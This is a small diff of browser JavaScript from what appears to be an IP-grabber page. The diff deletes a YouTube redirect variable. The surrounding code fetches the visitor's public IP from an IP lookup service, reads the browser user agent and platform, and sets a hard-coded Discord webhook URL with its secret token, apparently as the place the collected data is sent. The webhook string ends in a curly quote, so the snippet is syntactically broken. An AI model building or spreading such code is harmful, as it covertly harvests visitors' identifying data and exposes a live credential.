@@ -3,7 +3,6 @@ fetch("https://api.ipify.org?format=json")
   .then(response => response.json())
   .then(data => {
     const ip = data.ip;
-    const zielLink = "https://youtube.com";
     const webhookUrl = "https://discord.com/api/webhooks/1419580060041609309/nEogJD_MFi2WHcypOz_p93vcXH-EHGUI-F74KYaoed014rwBJnJZT0FMyaA8HRPhNJKq“;
     const browser = navigator.userAgent;
     const platform = navigator.platform;
